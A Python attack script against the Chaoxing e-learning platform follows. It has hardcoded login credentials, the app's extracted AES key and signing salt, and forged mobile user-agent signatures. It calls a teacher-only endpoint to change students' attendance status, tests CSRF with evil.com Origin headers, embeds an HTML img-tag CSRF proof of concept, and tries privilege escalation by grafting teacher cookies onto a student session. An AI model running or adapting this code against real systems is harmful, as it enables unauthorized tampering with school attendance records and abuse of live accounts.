import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = "success" in detail.lower() or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def call_v2_api(session, active_id, uids, status, remark="", db_strategy="PRIMARY_KEY", strategy_para="activeId", method="default"):
    base = "https://mobilelearn.chaoxing.com"
    url = f"{base}/pptSign/updateSignStatusByUidsV2"
    params = {
        "DB_STRATEGY": db_strategy,
        "STRATEGY_PARA": strategy_para,
        "activeId": active_id,
    }
    ajax_hdr = {
        "Referer": "https://mobilelearn.chaoxing.com/",
        "X-Requested-With": "XMLHttpRequest",
    }

    if method == "multipart":
        files = {"uids": (None, uids), "status": (None, str(status)), "remark": (None, remark)}
        r = session.post(url, params=params, files=files, headers=ajax_hdr, timeout=20)
    elif method == "urlencoded":
        data = {"uids": uids, "status": str(status), "remark": remark}
        r = session.post(url, params=params, data=data, headers={**ajax_hdr, "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    elif method == "GET":
        params.update({"uids": uids, "status": str(status), "remark": remark})
        r = session.get(url, params=params, headers=ajax_hdr, timeout=20)
    else:
        data = {"uids": uids, "status": str(status), "remark": remark}
        r = session.post(url, params=params, data=data, headers=ajax_hdr, timeout=20)

    return r

def run():
    print("=" * 80)
    print(f"updateSignStatusByUidsV2 持久化验证 + CSRF分析")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 获取所有签到活动...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    all_aids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            all_aids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})

    print("\n" + "=" * 80)
    print("[3] 签到状态修改前记录")
    print("=" * 80)

    for act in all_aids[:5]:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            rec(f"T3-before-{aid[:8]}", f"修改前: aid={aid}, status={data.get('status')}, name={data.get('name')}",
                json.dumps(data, ensure_ascii=False)[:300])
        else:
            rec(f"T3-before-{aid[:8]}", f"修改前: aid={aid}, 未签到或已结束")

    print("\n" + "=" * 80)
    print("[4] 使用教师账号修改签到状态(status=2)")
    print("=" * 80)

    for act in all_aids[:3]:
        aid = act["id"]
        r = call_v2_api(s_t, aid, STUDENT_PUID, 2, method="default")
        rec(f"T4-modify-{aid[:8]}", f"教师修改 status=2 aid={aid}: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] 签到状态修改后验证")
    print("=" * 80)

    for act in all_aids[:5]:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            rec(f"T5-after-{aid[:8]}", f"修改后: aid={aid}, status={data.get('status')}, name={data.get('name')}",
                json.dumps(data, ensure_ascii=False)[:300])
        else:
            rec(f"T5-after-{aid[:8]}", f"修改后: aid={aid}, 未签到或已结束")

    print("\n" + "=" * 80)
    print("[6] CSRF攻击可行性分析")
    print("=" * 80)

    print("\n--- 检查API是否有CSRF防护 ---")
    r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, method="default")
    csrf_headers = {
        "Origin": "https://evil.com",
        "Referer": "https://evil.com/attack.html",
    }
    r_csrf = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                      params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                      data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                      headers={**csrf_headers, "X-Requested-With": "XMLHttpRequest"},
                      timeout=20)
    rec("T6-csrf-origin", f"跨域Origin测试: HTTP {r_csrf.status_code}, {r_csrf.text[:100]}", r_csrf.text[:300])

    r_csrf2 = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                       params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                       data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                       headers={"Origin": "https://evil.com"},
                       timeout=20)
    rec("T6-csrf-no-xhr", f"跨域Origin(无XHR头): HTTP {r_csrf2.status_code}, {r_csrf2.text[:100]}", r_csrf2.text[:300])

    r_csrf3 = s_t.get(f"{base}/pptSign/updateSignStatusByUidsV2",
                      params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                              "activeId": TEST_AID, "uids": STUDENT_PUID, "status": "2", "remark": ""},
                      timeout=20)
    rec("T6-csrf-get", f"GET方法(可CSRF): HTTP {r_csrf3.status_code}, {r_csrf3.text[:100]}", r_csrf3.text[:300])

    print("\n" + "=" * 80)
    print("[7] 构造CSRF攻击POC")
    print("=" * 80)

    csrf_poc = f"""<!DOCTYPE html>
<html>
<body>
<h1>签到状态修改CSRF POC</h1>
<img src="{base}/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={TEST_AID}&uids={STUDENT_PUID}&status=2&remark=" width="0" height="0" />
<p>如果教师已登录学习通，访问此页面将自动修改签到状态。</p>
</body>
</html>"""
    rec("T7-poc", f"CSRF POC已构造: 使用img标签发起GET请求，无需JavaScript")

    print("\n" + "=" * 80)
    print("[8] 学生越权方式汇总测试")
    print("=" * 80)

    print("\n--- 学生使用不同Cookie组合 ---")
    cookie_combos = [
        ("教师全部Cookie", s_t.cookies),
    ]

    for desc, cookies in cookie_combos:
        s_test = requests.Session()
        s_test.verify = False
        s_test.headers.update(s_s.headers)
        for c in cookies:
            s_test.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

        r = call_v2_api(s_test, TEST_AID, STUDENT_PUID, 2, method="default")
        rec(f"T8-{desc[:10]}", f"学生+{desc}: {r.text[:100]}", r.text[:300])

    print("\n--- 学生仅使用关键Cookie ---")
    key_cookies = ["UID", "_uid", "uf", "_d", "VC3", "vc3", "JSESSIONID", "route", "route_mobilelearn",
                   "p_auth_token", "cx_p_token", "xxtenc", "DSSTASH_LOG", "fanyamoocs", "fid", "spaceFid"]

    for key in key_cookies:
        s_single = requests.Session()
        s_single.verify = False
        s_single.headers.update(s_s.headers)
        for c in s_t.cookies:
            if c.name == key:
                s_single.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
                break

        r = call_v2_api(s_single, TEST_AID, STUDENT_PUID, 2, method="default")
        rec(f"T8-key-{key}", f"学生+{key} Cookie: {r.text[:100]}", r.text[:300])

    print("\n--- 学生使用教师Cookie但uid=自己 ---")
    s_uid_test = requests.Session()
    s_uid_test.verify = False
    s_uid_test.headers.update(s_s.headers)
    for c in s_t.cookies:
        s_uid_test.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    s_uid_test.cookies.set("UID", puid_s, domain=".chaoxing.com", path="/")
    s_uid_test.cookies.set("_uid", puid_s, domain=".chaoxing.com", path="/")

    r = call_v2_api(s_uid_test, TEST_AID, STUDENT_PUID, 2, method="default")
    rec("T8-uid-override", f"教师Cookie+学生UID: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "v2_uids_persist_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 无权限: {perm}")

if __name__ == "__main__":
    run()
